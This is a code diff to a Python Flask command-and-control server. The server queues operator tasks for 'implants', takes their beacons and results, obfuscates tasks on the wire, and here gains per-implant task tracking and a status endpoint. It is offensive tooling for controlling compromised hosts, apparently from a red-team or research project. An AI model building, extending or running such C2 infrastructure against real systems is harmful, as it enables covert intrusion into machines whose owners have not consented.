@@ -94,7 +94,11 @@ ImplantTasksDict = dict()
 # 2. tasks' output data (sent back from implant) that were successful
 # 3. tasks' that failed (returned error code)
 # stored under taskID keys 
+
+# dict() of whole task sent by the operator is stored as a value:
 InputDict = dict()
+
+# strings of outpud data is stored
 OutputDict = dict()
 ErrorDict = dict()
 
@@ -183,12 +187,20 @@ def addTask():
     if request.method == 'POST' and request.is_json:
         reqData = request.get_json()
 
-        # add unique ID to the task (taskID)
-        reqData['id'] = secrets.token_hex()
-
         # check if all required fields are present (SN - implant serial number, name and header)
         if not 'SN' in reqData or not 'name' in reqData or not 'header' in reqData:
             return "<p>Badly formatted task!</p>"
+
+        # add unique ID to the task (taskID)
+        reqData['id'] = secrets.token_hex()
+        taskID = reqData['id']
+        serial_number = reqData['SN']
+
+        # assign generated taskID to specified implant 'SN' in ImplantTasksDict:
+        if ImplantTasksDict.get(serial_number) is None:
+            ImplantTasksDict[serial_number] = [taskID]
+        else:
+            ImplantTasksDict[serial_number].append(taskID)
 
         # convert JSON request to string and append it to TaskFifo 
         data = json.dumps(reqData)
@@ -200,28 +212,29 @@ def addTask():
     resp.append("<p>Pending tasks queue:</p>")
 
     for task in TaskFifo:
-        resp.append(task + '<br/>')
+        t = json.loads(task)
+        resp.append(t['id'] + '<br/>')
 
     resp.append("<p>Completed tasks:</p>")
 
-    for key, value in InputDict.items():
+    for key, taskEntry in InputDict.items():
         if key in OutputDict:
             resp.append('----------------------------------<br/>')
             resp.append('Task ID: ' + key + '<br/>')
             resp.append('Task raw input:<br/>')
-            resp.append(value + '<br/><br/>')
+            resp.append(taskEntry['SN'] + '<br/><br/>')
             resp.append('Task output:<br/>')
             resp.append(OutputDict[key].decode('utf-8') + '<br/>')
             resp.append('<br/>----------------------------------<br/><br/>')
 
     resp.append("<p>Failed tasks:</p>")
 
-    for key, value in InputDict.items():
+    for key, taskEntry in InputDict.items():
         if key in ErrorDict:
             resp.append('----------------------------------<br/>')
             resp.append('Task ID: ' + key + '<br/>')
             resp.append('Task raw input:<br/>')
-            resp.append(value + '<br/><br/>')
+            resp.append(taskEntry['SN'] + '<br/><br/>')
             resp.append('Task status code: ' + str(ErrorDict[key]) + '<br/>')
             resp.append('<br/>----------------------------------<br/><br/>')
 
@@ -232,17 +245,74 @@ def addTask():
 
 @app.route("/tasking/implants", methods=['GET'])
 def implants():
-    if request.method == 'GET':
+
+    implantSN = request.args.get('implant')
+
+    # if implant=<implantSN> not provided return only essential data aobut all implants: ImplantDict
+    if implantSN == None:
         return jsonify(ImplantDict)
+    # in other case return status about running/pending/completed tasks and input and output aof last completed task
     else:
-        return "<p>Not recognized request</p>"
+        pendingTasksN = 0
+        assignedTasksN = 0
+        completedTasksN = 0
+        errTasksN = 0
+        last_taskID = ""
+        last_task_command = ""
+        last_task_output = ""
+        errTasksN = 0
+
+        # list of TaskIDs assigned to 'implantSN' implant
+        # these tasks could be currently in one of the following states:
+        # pending - present in TaskFifo and not in InputDict
+        # assigned - present in InputDict and not in TaskFifo
+        # completed (successfully) - present in OutputDict
+        # failed (completed with an error) - present in ErrDict
+        if implantSN in ImplantTasksDict:
+            implant_tasks_list = ImplantTasksDict[implantSN]
+        else:
+            implant_tasks_list = []
+
+        for t in implant_tasks_list:
+            if t in OutputDict:
+                completedTasksN += 1
+            elif t in ErrorDict:
+                errTasksN += 1
+            elif t in InputDict:
+                assignedTasksN += 1
+            else:
+                pendingTasksN += 1
+
+        # get last completed task's ID
+        if completedTasksN > 0:
+            last_taskID = implant_tasks_list[-1]
+            if last_taskID in InputDict:
+                last_task_command = InputDict[last_taskID]['name']
+                if 'argv' in InputDict[last_taskID]:
+                    last_task_command += " " + InputDict[last_taskID]['argv']
+            if last_taskID in OutputDict:
+                last_task_output = OutputDict[last_taskID].decode('utf-8')
+
+            print(type(last_task_output))
+
+        resp = {
+                'pendingTasksN' : pendingTasksN,
+                'assignedTasksN' : assignedTasksN,
+                'completedTasksN' : completedTasksN,
+                'errTasksN' : errTasksN,
+                'last_taskID' : last_taskID,
+                'last_task_command' : last_task_command,
+                'last_task_output' : last_task_output,
+        }
+        return jsonify(resp)
+
 
 ### end of Handling operator's requests from console (adding new tasks and status display)
 
 ### Handling implant's beaconing
 
-# GET /endpoint - check if task is available (GET_TASK handler)
-# POST /endpoint - send in task's output data (POST_RESULT handler)
+# GET /endpoint - check if task is available (GET_TASK handler) - operator
+# POST /endpoint - send in task's output data (POST_RESULT handler) - implant
 @app.route("/endpoint", methods=['GET', 'POST'])
 def heartbeat():
     # Flask request:
@@ -312,14 +382,7 @@ def heartbeat():
         # and return it in the response
         if serial_number == cmdData['SN']:
             # postprocess task based on operator's input and calling implant's identity
-            implantTask = constructImplantTask(cmdData, implant_identity)
-
-            # append taskID to be executed to ImplantTasksDict under 'SN' key
-            taskID = cmdData['id']
-            if ImplantTasksDict.get(serial_number) is None:
-                ImplantTasksDict[serial_number] = [taskID]
-            else:
-                ImplantTasksDict[serial_number].append(taskID)
+            implantTask = constructImplantTask(cmdData, implant_identity) 
 
             # format / mask / obsfuscate / encode task before putting it on the wire
             return netMasquerade(implantTask, ImplantMessageType.GET_TASK)
@@ -350,7 +413,7 @@ def constructImplantTask(taskJSON, implant_identity):
     taskID = cmdData['id']
 
     # store task's input data for logging purposes
-    InputDict[taskID] = taskJSON
+    InputDict[taskID] = cmdData
 
     # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
     Instruction = {
